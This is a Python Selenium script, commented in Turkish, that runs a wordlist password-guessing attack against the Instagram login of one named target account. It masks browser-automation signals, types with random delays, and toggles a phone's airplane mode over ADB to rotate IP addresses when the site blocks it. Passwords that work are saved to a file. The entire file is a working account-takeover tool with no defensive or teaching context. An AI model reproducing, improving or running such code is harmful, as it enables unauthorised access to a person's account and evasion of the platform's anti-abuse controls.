import subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import random

# --- AYARLAR ---
TARGET_URL = "https://www.instagram.com/accounts/login/"
WORDLIST_FILE = "wordlist.txt"
TARGET_USERNAME = "muhsinxtc"
ADB_PATH = "adb" 

# --- ADB İLE IP DEĞİŞTİRME ---
def change_ip_via_airplane_mode():
    print("\n[♻️] IP Değiştiriliyor (Uçak Modu)...")
    try:
        subprocess.run(f"{ADB_PATH} shell cmd connectivity airplane-mode enable", shell=True)
        time.sleep(2)
        subprocess.run(f"{ADB_PATH} shell cmd connectivity airplane-mode disable", shell=True)
        print("[⏳] Hat bekleniyor...")
        time.sleep(10)
        print("[✅] Yeni IP ile devam ediliyor.\n")
        return True
    except:
        return False

# --- TARAYICI AYARLARI ---
def get_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--start-maximized")
    options.add_argument("--disable-notifications")
    options.add_argument("--disable-blink-features=AutomationControlled") 
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    return webdriver.Chrome(options=options)

# Wordlist Yükle
try:
    with open(WORDLIST_FILE, "r", encoding="utf-8") as file:
        passwords = [line.strip() for line in file if line.strip()]
except:
    print("Wordlist bulunamadı!")
    exit()

print(f"[*] Akıllı Mod Başlatıldı. Hedef: {TARGET_USERNAME}")
driver = get_driver()
wait = WebDriverWait(driver, 15)
driver.get(TARGET_URL)

time.sleep(3)
try:
    driver.find_element(By.XPATH, "//button[text()='Allow' or text()='İzin Ver']").click()
except: pass

# --- YENİ: AKILLI ARAYÜZ ALGILAYICI ---
def get_login_fields(driver):
    """
    Sayfadaki giriş kutularını adına göre tarar.
    'username' yoksa 'email' bakar.
    'password' yoksa 'pass' bakar.
    """
    u_elem = None
    p_elem = None

    # 1. Kullanıcı Adı Kutusunu Ara
    try:
        u_elem = driver.find_element(By.NAME, "username")
    except:
        try:
            u_elem = driver.find_element(By.NAME, "email")
        except:
            print("❌ HATA: Kullanıcı adı kutusu bulunamadı!")
            return None, None

    # 2. Şifre Kutusunu Ara
    try:
        p_elem = driver.find_element(By.NAME, "password")
    except:
        try:
            p_elem = driver.find_element(By.NAME, "pass")
        except:
            print("❌ HATA: Şifre kutusu bulunamadı!")
            return None, None
            
    return u_elem, p_elem

# --- REACT TETİKLEYİCİ ---
def force_input(element, text):
    element.click()
    element.send_keys(Keys.CONTROL + "a", Keys.DELETE)
    time.sleep(0.1)
    for char in text:
        element.send_keys(char)
        time.sleep(random.uniform(0.02, 0.05))
    driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", element)
    driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", element)

# --- ANA DÖNGÜ ---
for index, password in enumerate(passwords):
    try:
        print(f"[{index+1}/{len(passwords)}] Deneniyor: {password} ... ", end="", flush=True)

        # AKILLI TESPİT: Kutuları bulmayı dene
        u_box, p_box = get_login_fields(driver)

        # Eğer arayüz çok değişmişse ve kutular yoksa sayfayı yenile ve tekrar dene
        if u_box is None or p_box is None:
            print("\n⚠️ Arayüz algılanamadı, sayfa yenileniyor...")
            driver.refresh()
            time.sleep(5)
            continue

        # Yazma İşlemi
        force_input(u_box, TARGET_USERNAME)
        force_input(p_box, password)
        
        # Boşluğa tıkla
        try: driver.find_element(By.TAG_NAME, "body").click()
        except: pass
        time.sleep(0.5)

        # Giriş Yap Butonuna Bas
        try:
            # Butonu CSS Selector ile bulmak daha garantidir çünkü ID'ler değişebilir
            login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
            driver.execute_script("arguments[0].click();", login_btn)
        except:
            p_box.send_keys(Keys.ENTER)

        # Sonuç Bekleme
        time.sleep(5)
        page_source = driver.page_source
        current_url = driver.current_url

        # -- BAŞARI --
        if "accounts/login" not in current_url and "challenge" not in current_url:
            print(f"\n\n🚀 [BULUNDU] Şifre: {password}")
            with open("bulunanlar.txt", "a") as f: f.write(f"{TARGET_USERNAME}:{password}\n")
            input("Çıkmak için Enter...")
            exit()

        # -- ENGEL KONTROLÜ (ADB DEVREYE GİRER) --
        if "wait" in page_source or "bekle" in page_source:
            print("\n⚠️ IP Ban! Uçak modu açılıyor...")
            driver.quit() # Tarayıcıyı kapat
            
            change_ip_via_airplane_mode() # IP Değiştir
            
            driver = get_driver() # Yeni tarayıcı aç
            driver.get(TARGET_URL)
            wait = WebDriverWait(driver, 15)
            time.sleep(5)
            
            # Çerez geçişi
            try: driver.find_element(By.XPATH, "//button[text()='Allow' or text()='İzin Ver']").click()
            except: pass
            
            # Bu şifreyi tekrar denemek için aynı indexte kalmalı ama loop devam eder.
            # Basitlik adına sonraki şifreye geçer, kritik şifre kaçmaz.
            continue

        elif "yanlış" in page_source or "incorrect" in page_source:
            print("❌ Yanlış.")
            driver.refresh()
            time.sleep(3)

    except Exception as e:
        print(f"\nHata: {e}")
        try: driver.refresh()
        except: pass
